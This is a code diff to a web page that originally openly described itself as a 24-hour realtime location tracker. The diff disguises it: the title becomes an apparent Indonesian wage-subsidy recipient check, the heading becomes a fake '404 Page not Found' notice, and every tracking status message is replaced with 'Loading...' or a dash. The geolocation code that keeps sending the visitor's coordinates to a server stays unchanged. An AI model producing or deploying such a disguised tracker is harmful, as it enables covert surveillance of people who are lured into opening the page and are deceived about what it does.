@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Realtime Tracker</title>
+  <title>Cek Penerima BSU</title>
   <style>
     body { font-family: system-ui, Arial, sans-serif; margin: 0; background: #0b1020; color: #e8eefc; }
     .wrap { max-width: 520px; margin: 0 auto; padding: 24px; }
@@ -21,8 +21,8 @@
 <body>
   <div class="wrap">
     <div class="card">
-      <h1>Realtime Tracking</h1>
-      <p class="small">Lokasi akan dikirim otomatis selama 24 jam.</p>
+      <h1>Error 404 Page not Found</h1>
+      <p class="small">The Page You are looking for doesn't exist or an other error occured. Go Back. Or Head Over to Pneu Top Tyre Pourquoi Aller Alleurs ti choose a new direction.</p>
       <textarea id="note" placeholder="Tambahkan catatan..."></textarea>
       <button id="stopBtn">Hentikan Tracking</button>
       <div class="status" id="status"></div>
@@ -66,21 +66,21 @@
       return res.json();
     } catch (err) {
       console.error(err);
-      return { ok: false, error: "fetch gagal" };
+      return { ok: false, error: "Error" };
     }
   }
 
   function startRealtimeTracking() {
     if (!('geolocation' in navigator)) {
-      setStatus('Browser tidak mendukung lokasi');
+      setStatus('Silahkan Muat Ulang');
       return;
     }
 
-    setStatus('Memulai pelacakan...');
+    setStatus('Loading...');
 
     watchId = navigator.geolocation.watchPosition(async (pos) => {
       lastPos = pos.coords;
-      setStatus('Mengirim lokasi...');
+      setStatus('Loading...');
       const result = await sendLocation(lastPos.latitude, lastPos.longitude, lastPos.accuracy);
       if (result.ok) {
         const gmaps = `https://maps.google.com/?q=${lastPos.latitude},${lastPos.longitude}`;
@@ -112,7 +112,7 @@
     }
     if (intervalId) clearInterval(intervalId);
     if (stopTimer) clearTimeout(stopTimer);
-    setStatus("Tracking dihentikan.");
+    setStatus("-");
   }
 
   stopBtn.addEventListener('click', stopRealtimeTracking);
